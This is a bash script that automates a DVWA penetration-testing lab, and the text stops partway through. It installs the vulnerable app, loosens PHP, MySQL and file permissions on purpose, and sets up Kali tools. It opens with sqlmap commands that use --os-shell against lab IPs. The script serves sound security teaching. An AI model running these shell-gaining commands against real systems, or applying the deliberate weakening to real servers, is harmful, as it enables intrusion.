#!/bin/bash

./sqlmap.py --url="http://192.168.152.129/login.asp"
  --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell

sqlmap -u "http://192.168.1.128/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=vjke7qnd0h71a92c7vambk0fh1;security=low" --os-shell

sqlmap --url="http://10.0.0.108/dvwa/vulnerabilities/sqli/" --data="id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=9s5gt19vcn4b6e33t85dajjvf0" \
--flush-session --dbms="MySQL" --random-agent -D dvwa --os-shell

sqlmap -u 'protocol://test.server/test_url/' --cookie='id=*; PHPSESSID=jh3c0eqqu03mlcvjh1ddjj1spr; security=high' -p 'id' --param-filter='COOKIE' --skip='PHPSESSID,security' --flush-session --fresh-queries --proxy='https://localhost:7777'  --dbs --dbms='mysql' --os='linux' --ignore-code=404 --output-dir=./sqlmapdir/ --level=2

python sqlmap.py -u 'http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Submit=Submit' -H 'Cookie: security=low; PHPSESSID=3ac3021c46f5dea316bf21ce7647b96c' --batch --flush-session


# Script Name: dvwa-pentest-lab.sh
# Description: Automates DVWA setup on Ubuntu VM and attack tool setup/demonstration on Kali VM,
#              following a penetration testing tutorial.
#
# Usage for Ubuntu DVWA VM:
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s dvwa
#       - Installs SSH, DVWA with Apache2, and modern MySQL.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s mysql50
#       - Removes current DB server (MariaDB/MySQL) and installs MySQL 5.5 via Docker for DVWA.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s set_permissions_ubuntu
#       - Sets read/write permissions for DVWA directory (required for os-shell exploit).
#
# Usage for Kali VM (ensure DVWA Ubuntu VM is running and accessible):
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonGav/master/usyd/scripts-library/dvwa-pentest-lab.sh | sudo bash -s kali_prereqs
#       - Installs prerequisite attack tools on Kali.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_web_scan
#       - Runs dirb and gobuster web content scanners against DVWA.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_brute_force
#       - Provides instructions and sample commands for brute-force attacks (Burp Suite, Hydra).
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_vuln_scan
#       - Provides guidance for OWASP ZAP or OpenVAS scanning.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_sqlmap_sqli
#       - Provides sample sqlmap commands for basic SQL injection.
#
#   wget -qO- https://raw.githubusercontent.com/harshagv/pythonWorks/master/usyd/scripts-library/dvwa-pentest-lab.sh | DVWA_PHPSESSID=<PHPSESSID> DVWA_TARGET_URL="<http://DVWA_IP>" sudo -E bash -s kali_os_shell
#       - Attempts to get an OS shell on DVWA VM via sqlmap and extracts sensitive files.

# Generate the script logs
LOGFILE="$(pwd)/dvwa-pentest-lab-$(date +"%Y%m%d-%H%M%S").log"
exec > >(tee -a "$LOGFILE") 2>&1

# === ASCII Art Banner Start ===
echo ""
echo "##################################################################################"
echo "#   _______  ____    ____ ____    __    ____  ___                                #"
echo "#  |       \ \   \  /   / \   \  /  \  /   / /   \      DVWA PENTEST LAB         #"
echo "#  |  .--.  | \   \/   /   \   \/    \/   / /  ^  \     Setup Script             #"
echo "#  |  |  |  |  \      /     \            / /  /_\  \                             #"
echo "#  |  '--'  |   \    /       \    /\    / /  _____  \   Kali & Ubuntu Automation #"
echo "#  |_______/     \__/         \__/  \__/ /__/     \__\                           #"
echo "#                                                                                #"
echo "#                      Automating your vulnerable web app & attack tools!        #"
echo "##################################################################################"
echo ""
# === ASCII Art Banner End ===

# Stricter Error Handling
set -euo pipefail
IFS=$'\n\t'

### === COLOR CONSTANTS === ###
RESET="\033[0m"
GREEN="\033[1;32m"
RED="\033[1;31m"
YELLOW="\033[1;33m"
BLUE="\033[1;34m"
PINK="\033[1;35m"
CYAN="\033[1;36m"

### === PRINT FUNCTIONS === ###
print_info() { echo -e "${CYAN}[INFO]${RESET} $1"; }
print_success() { echo -e "${GREEN}[SUCCESS]${RESET} $1"; }
print_warn() { echo -e "${YELLOW}[WARNING]${RESET} $1"; }
print_error() { echo -e "${RED}[ERROR]${RESET} $1 ❌"; }
print_title() { echo -e "\n${PINK}=== $1 ===${RESET}\n"; }

# Signal-safe Cleanup
cleanup() {
  local exit_code=$?
  if [ $exit_code -ne 0 ]; then
    print_error "Script exited with error code: $exit_code"
  fi
  print_info "Cleaning up before exit."
  # Add any specific cleanup logic here, e.g., remove temp files
}
handle_interrupt() {
  print_error "Script interrupted by user (SIGINT)" >&2
  exit 130
}
trap cleanup EXIT
trap handle_interrupt INT

# === GLOBAL CONFIGURATION (USER EDITS REQUIRED ON KALI VM) ===
# IMPORTANT: For Kali VM functions, set the IP of your DVWA Ubuntu VM here.
# This IP must be reachable from your Kali VM.
# Example: "http://192.168.1.100" or "http://dvwa.local"
# Default target URL
DEFAULT_DVWA_TARGET_URL="http://192.168.56.101"

# Check if DVWA_TARGET_URL is already set as an environment variable or fallback to default
: "${DVWA_TARGET_URL:=$DEFAULT_DVWA_TARGET_URL}"

print_info "Using DVWA_TARGET_URL: $DVWA_TARGET_URL"

# if [ -z "${DVWA_TARGET_URL:-}" ]; then
#     echo -ne "\e[96mEnter the DVWA Target URL (default: ${DEFAULT_DVWA_TARGET_URL}, 15s timeout):\e[0m "
#     USER_INPUT_TARGET_URL="" # Initialize as empty string
#     if read -t 15 USER_INPUT_TARGET_URL < /dev/tty; then
#         DVWA_TARGET_URL="${USER_INPUT_TARGET_URL}" # Use user input if provided, else default
#     else
#         DVWA_TARGET_URL="${DEFAULT_DVWA_TARGET_URL}" # Timed out, use default
#     fi
#     print_info "Using DVWA_TARGET_URL (from prompt): ${DVWA_TARGET_URL}"
# else
#     # DVWA_TARGET_URL was already set as an environment variable
#     print_info "Using DVWA_TARGET_URL (from environment variable): ${DVWA_TARGET_URL}"
# fi

# Final check to ensure it's not the placeholder and user is aware if it's the default
if [[ "$DVWA_TARGET_URL" == "$DEFAULT_DVWA_TARGET_URL" ]]; then
    print_warn "DVWA_TARGET_URL is set to the default: ${DVWA_TARGET_URL}. Ensure this is correct for your setup."
fi
# -------------------------------------------------------------

### === UBUNTU DVWA VM FUNCTIONS === ###

# Function: ubuntu_install_ssh
# Installs and configures OpenSSH server on Ubuntu.
ubuntu_install_ssh() {
    print_title "=== Installing and Configuring OpenSSH Server ==="

    print_info "Updating system.."
    apt update && apt upgrade -y

    print_info "Installing OpenSSH server.."
    apt install -y openssh-server net-tools curl

    print_info "Editing SSH configuration: /etc/ssh/sshd_config"
    local SSHD_CONFIG="/etc/ssh/sshd_config"
    sed -i 's/^#Port 22/Port 22/' "$SSHD_CONFIG" || print_warn "Port 22 already uncommented or missing."
    sed -i 's/^#ListenAddress 0.0.0.0/ListenAddress 0.0.0.0/' "$SSHD_CONFIG" || print_warn "ListenAddress 0.0.0.0 already uncommented or missing."
    sed -i 's/^#PasswordAuthentication yes/PasswordAuthentication yes/' "$SSHD_CONFIG" || print_warn "PasswordAuthentication yes already uncommented or missing."
    # Optional: Enable root login, generally not recommended for security reasons
    # sed -i 's/^PermitRootLogin prohibit-password/PermitRootLogin yes/' "$SSSD_CONFIG" || true

    print_info "Configuring UFW firewall for SSH access.."
    ufw status || true
    ufw enable || print_warn "UFW already enabled."
    ufw allow 22 || print_warn "UFW rule for port 22 already exists."

    print_info "Restarting SSH service.."
    systemctl restart ssh

    print_success "OpenSSH server installed successfully!"
}

# Function: ubuntu_install_dvwa_apache_mysql
# Installs DVWA with Apache2, PHP, and Modern MySQL on Ubuntu.
ubuntu_install_dvwa_apache_mysql() {
    print_title "=== Installing DVWA with Apache2 and Modern MySQL ==="

    local DB_NAME="dvwa"
    local DB_USER="dvwa"
    local DB_HOST="localhost"
    local WEB_DIR="/var/www/html/dvwa"
    local SERVER_NAME="localhost" # Can be updated dynamically if needed.

    # --- Ask for SQL user password ---
    echo -e "\e[96mEnter SQL password for DVWA user (press Enter ↲ for default: pass):\e[0m"
    if ! read -t 15 DB_PASS < /dev/tty; then
        DB_PASS="pass"
    fi
    echo
    DB_PASS=${DB_PASS:-pass}

    print_info "Installing required packages for DVWA (Apache, PHP, MySQL).."
    apt update
    apt install -y apache2 mysql-server php php-mysqli php-gd php-zip php-json php-bcmath php-xml libapache2-mod-php git

    print_info "Enabling and starting Apache & MySQL.."
    systemctl enable apache2 --now
    systemctl enable mysql --now

    print_info "Cloning DVWA repository.."
    cd /var/www/html
    if [ -d "DVWA" ] || [ -d "dvwa" ]; then
        print_info "DVWA folder already exists, skipping clone.."
    else
        git clone https://github.com/digininja/DVWA.git
        mv DVWA dvwa
    fi

    print_info "Setting permissions.."
    sudo chown -R www-data:www-data /var/www/html/dvwa
    sudo chmod -R 755 /var/www/html/dvwa

    print_info "Configuring MySQL for DVWA.."
    # This assumes root can connect to MySQL initially without a password, or via auth_socket.
    print_info "Attempting to create DVWA database and user. You might be prompted for MySQL root password if set."
    # Using 'mysql -p' to ensure it prompts for password if root has one set.
    mysql -u root -p <<EOF
    CREATE DATABASE IF NOT EXISTS ${DB_NAME};
    CREATE USER IF NOT EXISTS '${DB_USER}'@'${DB_HOST}' IDENTIFIED BY '${DB_PASS}';
    GRANT ALL PRIVILEGES ON ${DB_NAME}.* TO '${DB_USER}'@'${DB_HOST}';
    FLUSH PRIVILEGES;
EOF

    print_info "Updating DVWA config file.."
    cd "$WEB_DIR/config" || { print_error "DVWA config directory not found."; exit 1; }
    cp -n config.inc.php.dist config.inc.php
    local CONFIG_FILE="/var/www/html/dvwa/config/config.inc.php"
    if [ ! -f "$CONFIG_FILE" ]; then
        print_error "Error: Configuration file not found at $CONFIG_FILE"
        exit 1
    fi
    sed -i 's/\r//g' "$CONFIG_FILE"
    sed -i "/'db_server'/c\\
    \$_DVWA[ 'db_server' ] = '$DB_HOST';
    " "$CONFIG_FILE"
    sed -i "/'db_user'/c\\
    \$_DVWA[ 'db_user' ] = '$DB_USER';
    " "$CONFIG_FILE"
    sed -i "/'db_password'/c\\
    \$_DVWA[ 'db_password' ] = '$DB_PASS';
    " "$CONFIG_FILE"
	# sed -i "s|^\s*\$_DVWA\s*\[\s*'db_server'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_server'] = '${DB_HOST}';|" "$CONFIG_FILE"
	# sed -i "s|^\s*\$_DVWA\s*\[\s*'db_user'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_user'] = '${DVWA_DB_USER}';|" "$CONFIG_FILE"
	# sed -i "s|^\s*\$_DVWA\s*\[\s*'db_password'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_password'] = '${DVWA_DB_PASS}';|" "$CONFIG_FILE"
	# sed -i "s|^\s*\$_DVWA\s*\[\s*'db_database'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_database'] = '${DVWA_DB_NAME}';|" "$CONFIG_FILE"

	print_info "DVWA configuration file updated successfully."

    print_info "Configuring PHP settings for DVWA.."
    local PHP_VER=$(php -r 'echo PHP_MAJOR_VERSION.".".PHP_MINOR_VERSION;' 2>/dev/null || echo "8.3") # Fallback to 8.3
    local PHPINI="/etc/php/${PHP_VER}/apache2/php.ini"
    sed -i 's/^\s*allow_url_fopen\s*=.*/allow_url_fopen = On/' "$PHPINI" || true
    sed -i 's/^\s*allow_url_include\s*=.*/allow_url_include = On/' "$PHPINI" || true

    print_info "Restarting Apache.."
    systemctl restart apache2

    ### Apache Configuration for Localhost Only ###
    print_info "Setting Apache to localhost-only mode"
    # 1) Set GLOBAL ServerName in apache2.conf to prevent AH00558 warning
    if ! grep -q "ServerName" /etc/apache2/apache2.conf; then
        print_info "Adding global ServerName to apache2.conf"
        echo "ServerName ${SERVER_NAME}" | sudo tee -a /etc/apache2/apache2.conf > /dev/null
    else
        print_info "Updating existing global ServerName in apache2.conf"
        sudo sed -i "s/^ServerName.*/ServerName ${SERVER_NAME}/" /etc/apache2/apache2.conf
    fi
    # 2) Set Apache to listen only on 127.0.0.1:80
    sed -i 's/^Listen .*/Listen 80/' /etc/apache2/ports.conf
    # 3) Create DVWA VirtualHost config
    sudo tee /etc/apache2/sites-available/dvwa.conf > /dev/null <<EOF
    <VirtualHost *:80>
        ServerName ${SERVER_NAME}
        DocumentRoot /var/www/html

        <Directory /var/www/html/dvwa>
            Options Indexes FollowSymLinks
            AllowOverride All
            Require all granted
        </Directory>

        ErrorLog \${APACHE_LOG_DIR}/dvwa_error.log
        CustomLog \${APACHE_LOG_DIR}/dvwa_access.log combined
    </VirtualHost>
EOF
    # 3 Enable site and modules
    sudo a2ensite dvwa.conf || print_warn "DVWA site already enabled."
    sudo a2enmod rewrite || print_warn "Rewrite module already enabled."
    sudo a2dissite 000-default.conf || print_warn "Default site already disabled."
    sudo apache2ctl configtest
    sudo apache2ctl -S

    print_info "Configuring UFW firewall for HTTP access.."
    ufw allow 80 || print_warn "UFW rule for port 80 already exists."

    # 4 Restart Apache
    sudo systemctl restart apache2

    echo "======================================="
    print_success "[✔] DVWA configured successfully (Modern MySQL)!"
    print_title "Global ServerName set to ${SERVER_NAME}"
    curl -I http://localhost/dvwa/setup.php || print_warn "Curl to setup.php failed, verify Apache is running."
    print_title "  → Accessible at: http://${SERVER_NAME}/dvwa/setup.php"
    print_title "Default DB User: ${DB_USER}, Password: ${DB_PASS}"
    print_title " Username : admin"
    print_title " Password : password (DVWA default)"
    echo "======================================="
}

# Function: ubuntu_install_mysql_docker_vulnerable
# Removes current database and installs MySQL 5.5 in Docker for DVWA on Ubuntu.
ubuntu_install_mysql_docker_vulnerable() {
    print_title "=== Installing Vulnerable MySQL (Dockerized) for DVWA ==="
    print_warn "Note: MySQL 5.0.15 is not readily available as a pre-built Docker image."
    # MySQL 5.5: https://hub.docker.com/layers/library/mysql/5.5/images/sha256-d404d78aa797c87c255e5ae2beb5d8d0e4d095f930b1f20dc208eaa957477b74
    print_warn "This script will install MySQL 5.5 in a Docker container as an older, vulnerable alternative."
    print_warn "If you specifically need 5.0.15, you would need to build a custom Docker image from source."

    local VULN_MYSQL_VERSION="5.5" # Using 5.5 as a readily available vulnerable version via Docker Hub
    local MYSQL_IMAGE="mysql"
    local CONTAINER_NAME="dvwa-vulnerable-mysql"
    local MYSQL_ROOT_PASSWORD="password" # Consistent with other parts of the script
	local HTML_ROOT_PATH="/var/www/html"
    local DVWA_DB_NAME="dvwa"
    local DVWA_DB_USER="dvwa"
    local DVWA_DB_PASS="pass"
    local DB_HOST="127.0.0.1" # DVWA will connect to localhost, which is mapped to the container

    print_warn "This will stop and remove existing MySQL/MariaDB packages and data, and then install Docker."
    print_warn "It will then deploy a MySQL ${VULN_MYSQL_VERSION} Docker container."
    echo -ne "Are you sure you want to continue? (y/N) "
    if ! read -t 15 -n 1 -r REPLY < /dev/tty; then
        REPLY="N"
    fi
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Aborting vulnerable MySQL Docker installation."
        exit 1
    fi

    # 1. Stop and purge existing database servers
    print_info "Stopping and purging existing database servers (MySQL/MariaDB) to avoid port conflicts.."
    systemctl stop mysql || true
    systemctl stop mariadb || true
    apt-get purge -y mysql-server mysql-client mysql-common mysql-server-core-* mysql-client-core-* mariadb-server mariadb-client mariadb-common || true
    apt-get autoremove -y
    apt-get clean
    rm -rf /etc/mysql /var/lib/mysql /var/lib/mysql/mysql # Clean up old data directories
    print_success "Existing database services purged."

    # 2. Install Docker
    print_info "Installing Docker.."
    apt-get update
    # Install Docker's required packages
    apt-get install -y ca-certificates curl gnupg lsb-release
    # Add Docker's GPG key
    mkdir -m 0755 -p /etc/apt/keyrings
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
    # Add Docker repository
	echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/ubuntu \
      $(lsb_release -cs) stable" | tee /etc/apt/sources.list.d/docker.list > /dev/null
    apt-get update
    # Install Docker components
    apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
    systemctl enable docker --now
    print_success "Docker installed and started."
    TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    if [ -z "$TARGET_USER" ]; then
        print_error "Could not determine target user. Exiting."
        exit 1
    fi
    USER_HOME=$(eval echo "~${TARGET_USER}")
    sudo usermod -aG docker "$TARGET_USER"
    print_warn "User '$TARGET_USER' added to 'docker' group. Please LOG OUT and LOG BACK IN (or reboot) for this change to take full effect."

    # 3. Pull and Run MySQL Docker Container
    # Detect system architecture
    ARCH=$(uname -m)
	if [[ "$ARCH" == "x86_64" || "$ARCH" == "amd64" ]]; then
	    MYSQL_IMAGE="mysql"
	    print_info "Detected AMD64 architecture. Pulling standard MySQL image."
    elif [[ "$ARCH" == "arm64" || "$ARCH" == "aarch64" ]]; then
        print_info "Detected ARM64 architecture. Pulling ARM compatible MySQL image."
	    MYSQL_IMAGE="biarms/mysql"
	fi

    docker pull "${MYSQL_IMAGE}:${VULN_MYSQL_VERSION}" || { print_error "Failed to pull MySQL Docker image."; exit 1; }

    print_info "Stopping and removing any old '${CONTAINER_NAME}' container if it exists.."
    docker stop "${CONTAINER_NAME}" &>/dev/null || true
    docker rm "${CONTAINER_NAME}" &>/dev/null || true

    print_info "Starting MySQL ${VULN_MYSQL_VERSION} Docker container '${CONTAINER_NAME}'.."
    # Map container port 3306 to host port 3306, relying on native DB being purged.
    # Environment variables handle initial root password, DVWA database, and DVWA user creation.
	docker run --name "${CONTAINER_NAME}" \
	    --network host \
	    -v "${HTML_ROOT_PATH}:${HTML_ROOT_PATH}" \
	    -e MYSQL_ROOT_PASSWORD="${MYSQL_ROOT_PASSWORD}" \
	    -e MYSQL_DATABASE="${DVWA_DB_NAME}" \
	    -e MYSQL_USER="${DVWA_DB_USER}" \
	    -e MYSQL_PASSWORD="${DVWA_DB_PASS}" \
	    -d "${MYSQL_IMAGE}:${VULN_MYSQL_VERSION}" \
	    --secure-file-priv="" || { print_error "Failed to start MySQL Docker container. Check 'docker logs ${CONTAINER_NAME}' for details."; exit 1; }

    print_info "Waiting for MySQL container to become healthy (up to 90 seconds).."
    local RETRIES=18 # 18 * 5 seconds = 90 seconds
    local COUNT=0
    while ! docker exec "${CONTAINER_NAME}" mysqladmin ping -h localhost --silent; do
        sleep 5
        COUNT=$((COUNT+1))
        if [ "$COUNT" -ge "$RETRIES" ]; then
            print_error "${MYSQL_IMAGE} Docker container did not start in time. Check 'docker logs ${CONTAINER_NAME}' and 'docker ps'."
            exit 1
        fi
        print_info "Still waiting for MySQL container ($COUNT/$RETRIES).."
    done
    print_success "${MYSQL_IMAGE} ${VULN_MYSQL_VERSION} Docker container started and is responsive."

    # Grant FILE privilege to the DVWA user so sqlmap --os-shell can work
    print_info "Granting FILE privilege to '${DVWA_DB_USER}' user..."
    docker exec "${CONTAINER_NAME}" mysql -u root -p"${MYSQL_ROOT_PASSWORD}" -e "GRANT FILE ON *.* TO '${DVWA_DB_USER}'@'%'; FLUSH PRIVILEGES;"
    print_success "FILE privilege granted."
	
    # 4. Update DVWA Config
    print_info "Updating DVWA config file for Dockerized MySQL.."
    local WEB_DIR_DVWA="/var/www/html/dvwa"
    local CONFIG_FILE="$WEB_DIR_DVWA/config/config.inc.php"
    if [ ! -f "$CONFIG_FILE" ]; then
        print_error "DVWA configuration file not found at $CONFIG_FILE. Did DVWA get installed first?"
        exit 1
    fi
    sed -i 's/\r//g' "$CONFIG_FILE" # Remove Windows-style carriage returns

	# Update db_server to $DB_HOST - e.g. '127.0.0.1' to force TCP connection
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_server'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_server'] = '${DB_HOST}';|" "$CONFIG_FILE"
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_user'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_user'] = '${DVWA_DB_USER}';|" "$CONFIG_FILE"
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_password'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_password'] = '${DVWA_DB_PASS}';|" "$CONFIG_FILE"
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_database'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_database'] = '${DVWA_DB_NAME}';|" "$CONFIG_FILE"
	sed -i "s|^\s*\$_DVWA\s*\[\s*'db_port'\s*\]\s*=\s*'[^']*';|\\\$_DVWA['db_port'] = '${DB_PORT:-3306}';|" "$CONFIG_FILE"
    print_info "DVWA configuration file updated for Dockerized MySQL."

    print_info "Restart apache2 service.."
 	sudo systemctl restart apache2

    print_success "Vulnerable MySQL (${VULN_MYSQL_VERSION}) Docker container is running and DVWA is configured to use it!"
    print_info "Remember to ensure your DVWA web server (Apache2) is running on the Ubuntu VM."
    print_info "Go to DVWA's /setup.php page in your browser (http://localhost/dvwa/setup.php) to configure and create the database tables."
    print_info "MySQL Docker container '${CONTAINER_NAME}' is configured to start automatically with Docker."

 	print_info "Verifying DVWA login page is accessible..."
	
	# Give the web server a few seconds to start fully
	sleep 5
	
	if curl -s -o /dev/null -w "%{http_code}" http://localhost/dvwa/login.php | grep -q "200"; then
	    print_success "DVWA login page is accessible at http://localhost/dvwa/login.php"
	else
	    print_error "DVWA login page is NOT accessible. Check Apache2 and Docker MySQL container."
	    print_info "Try checking Apache logs: journalctl -u apache2 or /var/log/apache2/error.log"
	    print_info "Also check Docker MySQL logs: docker logs ${CONTAINER_NAME}"
	fi
}

# Function: ubuntu_set_dvwa_permissions
# Sets read/write permissions for the DVWA directory on Ubuntu (for OS shell exploit).
ubuntu_set_dvwa_permissions() {
    print_title "=== Setting DVWA Directory Permissions for OS Shell Exploitation ==="
    local DVWA_PATH="/var/www/html/dvwa"
    if [ ! -d "$DVWA_PATH" ]; then
        print_error "DVWA directory '$DVWA_PATH' not found. Please ensure DVWA is installed first."
        exit 1
    fi
    print_warn "WARNING: This command makes the DVWA directory and its contents world-writable (ugo+rw), which is a significant security risk for any production environment!"

    echo -ne "Are you absolutely sure you want to run 'chmod -R ugo+rw ${DVWA_PATH}'? (y/N) "
    if ! read -t 15 -n 1 -r REPLY < /dev/tty; then
        REPLY="N"
    fi
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        print_info "Aborting permission change. OS shell exploitation might fail without this."
        exit 1
    fi

    sudo chmod -R ugo+rw "$DVWA_PATH"
	sudo ls -la "$DVWA_PATH"
    print_success "Permissions set for $DVWA_PATH to be world-writable (ugo+rw)."
    print_info "This is specifically for enabling sqlmap's --os-shell upload capabilities to write files to the web root."
}


### === KALI VM FUNCTIONS === ###
# https://veildefenders.com/kali-linux-burp-suite-configuration/

# Function: kali_install_tools_prerequisites
# Installs common penetration testing tools on Kali Linux, including Docker for ZAP.
kali_install_tools_prerequisites() {
    print_title "=== Installing Kali Attack Tools Prerequisites ==="
    print_info "Updating system and installing required attack tools.."
    sudo apt update
    sudo apt install -y \
      dirb gobuster seclists \
      hydra sqlmap nikto burpsuite zaproxy \
      python3-pip \
      pipx \
      net-tools curl git libnss3-tools chromium

    TARGET_USER=$(logname 2>/dev/null || echo "$SUDO_USER")
    if [ -z "$TARGET_USER" ]; then
        print_error "Could not determine target user. Exiting."
        exit 1
    fi
    USER_HOME=$(eval echo "~${TARGET_USER}")

    # === Centralized Output Directory Setup for Target User ===
    local BASE_SCANS_DIR="${USER_HOME}/scans/dvwa"
    print_info "Ensuring base scans directory exists and is owned by '$TARGET_USER': ${BASE_SCANS_DIR}"
    sudo mkdir -p "${BASE_SCANS_DIR}"
    sudo chown -R "$TARGET_USER":"$TARGET_USER" "${BASE_SCANS_DIR}"
    print_success "Base scans directory prepared."
    # ==========================================================

    # Ensure pipx environment directories exist and have correct permissions
    print_info "Ensuring correct permissions for pipx directories for user '$TARGET_USER'..."
    sudo -u "$TARGET_USER" mkdir -p "${USER_HOME}/.local/state/pipx"
    sudo -u "$TARGET_USER" mkdir -p "${USER_HOME}/.local/share/pipx"

    # Add pipx executables to PATH for the current script's execution context
    local PIPX_BIN_DIR="${USER_HOME}/.local/bin"
    if [[ ":$PATH:" != *":${PIPX_BIN_DIR}:"* ]]; then
        print_info "Adding ${PIPX_BIN_DIR} to PATH for current script execution."
        export PATH="$PATH:${PIPX_BIN_DIR}"
    fi

    # Ensure pipx's environment is correctly set up for the target user's shell configuration
    print_info "Ensuring pipx path is correctly set up in shell config for user '$TARGET_USER'..."
    sudo -u "$TARGET_USER" pipx ensurepath --force > /dev/null 2>&1 || print_warn "pipx ensurepath failed for user '$TARGET_USER'."

    # Installing/Upgrading zap-cli-v2
    print_info "Installing/Upgrading zap-cli-v2 (Modern Python wrapper for OWASP ZAP API).."
    if sudo -u "$TARGET_USER" pipx install zap-cli-v2 --force >/dev/null 2>&1; then
        print_success "zap-cli-v2 installed/upgraded successfully for user '$TARGET_USER'."
    else
        print_error "Failed to install/upgrade zap-cli-v2 for user '$TARGET_USER'."
    fi
    
    # Verify zap-cli-v2 is executable *within the current script's PATH*
    if command -v zap-cli-v2 &> /dev/null; then
        print_success "zap-cli-v2 executable found in current PATH."
    else
        print_error "zap-cli-v2 executable NOT found in current PATH even after installation attempt."
    fi

    # Install JDK for ZAP if not installed
    print_info "Installing JDK for ZAP..."
    sudo apt-get install -y openjdk-21-jdk || sudo apt-get install -y default-jdk || print_warn "Failed to install recommended JDK for ZAP."

    # Dynamically find Burp Suite JAR path
    BURP_JAR_PATH=$(find /usr/bin /usr/share /opt -type f -name "burpsuite*.jar" 2>/dev/null | head -n 1)
    if [ -z "$BURP_JAR_PATH" ]; then
        print_error "Could not find Burp Suite JAR on system."
        exit 1
    fi
    print_info "Found Burp Suite JAR at: $BURP_JAR_PATH"

    # Start Burp Suite with defaults, no GUI prompt in background
    print_info "Starting Burp Suite using defaults in background.."
    BURP_JAR_PATH=$(find /usr/share/burpsuite /opt -type f -name "burpsuite*.jar" 2>/dev/null | head -n 1)
    BURP_JAR_PATH=${BURP_JAR_PATH:-/usr/share/burpsuite/burpsuite.jar}
    if [ -z "$BURP_JAR_PATH" ]; then
      print_error "Burp Suite JAR not found!"
      exit 1
    fi

    sudo -u "$TARGET_USER" nohup java -Djava.awt.headless=true -jar "$BURP_JAR_PATH" --use-defaults > /dev/null 2>&1 &
    #sudo -u "$TARGET_USER" nohup java -Djava.awt.headless=true -jar "$BURP_JAR_PATH" --headless --use-defaults --project-file=/dev/null > /dev/null 2>&1 &
    BURP_PID=$!
    sleep 10  # wait for Burp to initialize

    print_info "Waiting for Burp proxy listener on 127.0.0.1:8080..."
    for i in {1..30}; do
      if nc -z 127.0.0.1 8080; then
        print_success "Burp proxy listener is ready."
	break
      fi
      sleep 1
    done

    # ---------- BURP CERT: AUTO DOWNLOAD AND INSTALL ----------
    local BURP_CERT_DER_PATH="${USER_HOME}/burp_cert.der"
    local BURP_CERT_PEM_PATH="${USER_HOME}/burp_cert.pem"
    print_info "Downloading BurpSuite certificate from http://127.0.0.1:8080/cert ..."
    if curl -s -o "${BURP_CERT_DER_PATH}" http://127.0.0.1:8080/cert; then
        print_success "Downloaded Burp certificate to: ${BURP_CERT_DER_PATH}"
    else
        print_error "Failed to download Burp certificate. Is Burp running and proxy on 127.0.0.1:8080?"
        return 1
    fi

    print_info "Converting DER to PEM format for system trust store..."
    openssl x509 -inform DER -in "${BURP_CERT_DER_PATH}" -out "${BURP_CERT_PEM_PATH}"

    # System-wide trust store install
    print_info "Installing Burp cert into system trust store..."
    sudo cp "${BURP_CERT_PEM_PATH}" /usr/local/share/ca-certificates/burp_cert.crt
    sudo update-ca-certificates
    print_success "Burp certificate installed into system trust store."

    # Chromium/Firefox NSS trust store install (for $TARGET_USER)
    print_info "Installing Burp cert into Chromium/Firefox (NSS) trust store for ${TARGET_USER}..."
    CERT_NAME="PortSwigger CA"
    USER_NSS_DB="${USER_HOME}/.pki/nssdb"
    sudo -u "$TARGET_USER" mkdir -p "${USER_NSS_DB}"
    if ! sudo -u "$TARGET_USER" certutil -d sql:"${USER_NSS_DB}" -L | grep -q "${CERT_NAME}"; then
      sudo -u "$TARGET_USER" certutil -d sql:"${USER_NSS_DB}" -N --empty-password || true
      sudo -u "$TARGET_USER" certutil -A -d sql:"${USER_NSS_DB}" -n "${CERT_NAME}" -t "TCu,Cu,Tu" -i "${BURP_CERT_PEM_PATH}"
      print_success "Burp certificate installed into NSS trust store."
    else
      print_info "Burp certificate already present in NSS trust store."
    fi

    # Launch Chromium with proxy preconfigured and proper flags to avoid sandbox and cert issues
    print_info "Launching Chromium with Burp proxy (127.0.0.1:8080)..."
